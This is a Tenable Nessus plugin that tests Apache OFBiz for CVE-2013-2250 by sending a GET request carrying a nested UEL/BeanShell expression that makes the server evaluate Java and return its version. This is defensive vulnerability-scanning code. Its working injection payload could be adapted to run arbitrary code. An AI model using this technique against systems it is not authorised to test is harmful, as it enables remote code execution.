#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(69100);
  script_version("$Revision: 1.2 $");
  script_cvs_date("$Date: 2015/10/13 15:19:33 $");

  script_cve_id("CVE-2013-2250");
  script_bugtraq_id(61369);
  script_osvdb_id(95522);

  script_name(english:"Apache OFBiz Nested Expression Arbitrary UEL Function Execution");
  script_summary(english:"Attempts to execute Java code");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web application is affected by a code execution
vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The version of Apache OFBiz hosted on the remote host is affected by a
code execution vulnerability that could allow the execution of arbitrary
UEL functions.  Specially crafted input passed to the getInstance()
method of the FlexibleStringExpander class can result in the evaluation
of nested Java Unified Expression Language expressions.  A remote,
unauthenticated attacker could exploit this to execute arbitrary UEL
functions. 

Note that the application is reportedly also affected by a cross-site
scripting vulnerability in the 'View Log' page of the Webtools
application; however, Nessus has not tested for this issue."
  );
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2013/Jul/142");
  script_set_attribute(attribute:"see_also", value:"http://svn.apache.org/viewvc?view=revision&revision=1500772");
  script_set_attribute(attribute:"solution", value:"Upgrade to Apache OFBiz 10.04.06 / 11.04.03 / 12.04.02 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/07/20");
  script_set_attribute(attribute:"patch_publication_date", value:"2013/07/08");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/07/29");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:apache:open_for_business_project");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2015 Tenable Network Security, Inc.");

  script_dependencies("ofbiz_detect.nasl");
  script_require_keys("www/ofbiz/port");
  script_require_ports("Services/www", 8443, 8080);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_kb_item_or_exit('www/ofbiz/port');
ecommerce = get_install_from_kb(appname:'ofbiz_ecommerce', port:port);

# it's possible the ecommerce webapp wasn't detected because
# 1) the "Perform thorough tests" setting wasn't enabled when the detection plugin ran
# 2) it was moved into the root
# 3) the 'powered by' footer (which the detection plugin keys on) was modified/removed
if (isnull(ecommerce))
  dirs = make_list('', '/ecommerce');
else
  dirs = make_list(ecommerce['dir']);

java = 'System.getProperty("java.version")';
script = "${'Java%20Version%20${bsh:" + java + "}'}";

foreach dir (dirs)
{
  url = dir + "/products/" + script;
  res = http_send_recv3(
    method : "GET",
    item   : url,
    port   : port,
    exit_on_fail : TRUE,
    follow_redirect : 1
  );

  headers = parse_http_headers(status_line:res[0], headers:res[1]);
  if (isnull(headers)) continue;
  if (headers['$code'] == 302)
  {
    match = eregmatch(
      string:headers['location'],
      pattern:'^http://[^:/]+(:[0-9]+)?(/.+)$'
    );

    if (isnull(match)) break;
    if (isnull(match[1]))
      port = 8080;
    else
      port = int(match[1] - ':');

    res2 = http_send_recv3(
      method : "GET",
      item   : url,
      port   : port,
      exit_on_fail : TRUE
    );
  }

   match = eregmatch(
     string:res2[2],
     pattern:"Category not found for Category ID Java Version (.+)&#33;");
   ver = match[1];

  if (isnull(match))
    audit(AUDIT_WEB_APP_NOT_AFFECTED, 'OFBiz', build_url(qs:dir + '/', port:port));

  if (!isnull(ver) && ver =~ '^[0-9._]+')
  {
    if (report_verbosity > 0)
    {
      snip = crap(data:"-", length:30) + ' snip ' + crap(data:"-", length:30);
      report =
        '\nNessus executed the following Java code :' +
        '\n' +
        '\n' +java + '\n' +
        '\nby sending the following request :' +
        '\n' +
        '\n' + snip +
        '\n' + http_last_sent_request() +
        '\n' + snip + '\n' +
        '\nWhich returned the following value :' +
        '\n' +
        '\n' + ver + '\n';
      security_hole(port:port, extra:report);
    }
    else security_hole(port);
    exit(0);
  }
}
audit(AUDIT_HOST_NOT, 'affected');
